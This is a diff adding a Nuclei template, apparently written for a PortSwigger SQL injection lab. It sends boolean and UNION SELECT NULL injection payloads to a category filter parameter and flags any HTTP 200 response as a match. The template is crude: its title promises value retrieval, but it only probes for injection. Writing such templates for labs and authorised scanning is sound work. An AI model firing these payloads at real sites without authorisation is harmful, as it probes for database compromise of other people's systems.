@@ -1,0 +1,54 @@
+id: 10_lab_sqli_portswigger 
+
+info:
+  name: SQL injection UNION attack, retrieving multiple values in a single column
+  author: XI
+  severity: high
+  description: SQL injection UNION attack, retrieving multiple values in a single column
+  reference: https://XI
+  tags: portswigger, learn, nuclei, SQLi
+
+http:
+  - method: GET
+    path: 
+      - "{{BaseURL}}/filter?category=Gifts{{detection}}"
+
+    payloads:
+      detection:
+        - "'OR+1=1--"
+        - "'OR+1=1#"
+        - "'OR+1=1/*"
+  
+    stop-at-first-match: false
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path: 
+      - "{{BaseURL}}/filter?category=Gifts{{union_detection}}"
+
+    payloads:
+      union_detection:
+        - "'UNION+SELECT NULL--"
+        - "'UNION+SELECT NULL, NULL--"
+        - "'UNION+SELECT NULL, NULL, NULL--"
+        - "'UNION+SELECT NULL, NULL, NULL, NULL--"
+        - "'UNION+SELECT NULL, NULL, NULL, NULL, NULL--"
+        - "'UNION+SELECT NULL#"
+        - "'UNION+SELECT NULL, NULL#"
+        - "'UNION+SELECT NULL, NULL, NULL#"
+        - "'UNION+SELECT NULL, NULL, NULL, NULL#"
+        - "'UNION+SELECT NULL, NULL, NULL, NULL, NULL#"
+        - "'UNION+SELECT NULL/*"
+        - "'UNION+SELECT NULL, NULL/*"
+        - "'UNION+SELECT NULL, NULL, NULL/*"
+        - "'UNION+SELECT NULL, NULL, NULL, NULL/*"
+        - "'UNION+SELECT NULL, NULL, NULL, NULL, NULL/*"
+
+    stop-at-first-match: false
+    matchers:
+      - type: status
+        status:
+          - 200
